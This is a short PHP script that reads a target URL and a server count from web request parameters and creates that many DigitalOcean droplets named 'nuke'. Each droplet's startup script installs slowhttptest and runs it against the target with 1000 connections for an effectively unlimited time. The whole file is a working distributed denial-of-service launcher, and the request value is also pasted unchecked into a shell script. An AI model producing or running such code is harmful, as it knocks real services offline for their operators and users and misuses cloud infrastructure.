<?php
require 'includes/api_config.php';

$target_url=$_REQUEST["host_url"];

//PHP heredoc string http://www.php.net/manual/en/language.types.string.php#language.types.string.syntax.heredoc
// So we have defined droplet startup script to launch slowhttptool with 1000 connections :)
$cloud_init = <<<EOD
#!/bin/bash
apt update -y
apt upgrade -y
apt install slowhttptest -y
slowhttptest -u $target_url -c 1000 -l 2147483647 &
EOD;

$ssh_keys = array(''); //Set your SSH-Fingerprint of SSH Public key that you are gonna use from digital ocean account. 

for($i=0; $i<(int)$_REQUEST["serv_count"]; $i++){
    $droplet->create('nuke' . $i, 'blr1', '512mb', 'ubuntu-16-04-x64', FALSE, FALSE, TRUE, $ssh_keys, $cloud_init, TRUE);
    sleep(1);
}
?>